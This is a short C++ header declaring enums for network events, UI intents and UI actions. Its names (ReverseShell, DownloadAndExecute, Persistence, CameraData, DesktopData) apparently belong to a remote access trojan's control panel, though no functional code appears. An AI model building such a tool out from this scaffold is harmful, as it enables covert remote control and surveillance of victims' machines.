#pragma once

enum class NetEventType
{
	Unknown = -1,
	NewConnection,
	PresentationData,
	PresentationDataExtended,
	ReverseShell,
	ProcessListData,

	DesktopConfigData,
	DesktopData,

	CameraConfigData,
	CameraData,

	Chat,
	
	Disconnected,
	TestEvent,

	MinNetEvent = NewConnection,
	MaxNetEvent = TestEvent,
};


enum class UiEventIntent
{
	InfoIntent,
	Logs,
	ProcessListIntent,
	ReverseShellIntent,
	DownloadAndExecute,
	ChatIntent,
	DesktopIntent,
	CameraIntent,
	Persistence,
	ConnectionIntent,

	MinIntent = InfoIntent,
	MaxIntent = ConnectionIntent,
};

enum class UiEventAction
{
	// to UiMediator
	ShowAction,
	UpdateAction,
	CloseAction,

	MinToUiMediator = ShowAction,
	MaxToUiMediator = CloseAction,

	// from UiMediator
	StartAction,
	PushAction,
	PauseAction,
	StopAction,

	MinFromUiMediator = StartAction,
	MaxFromUiMediator = StopAction,
};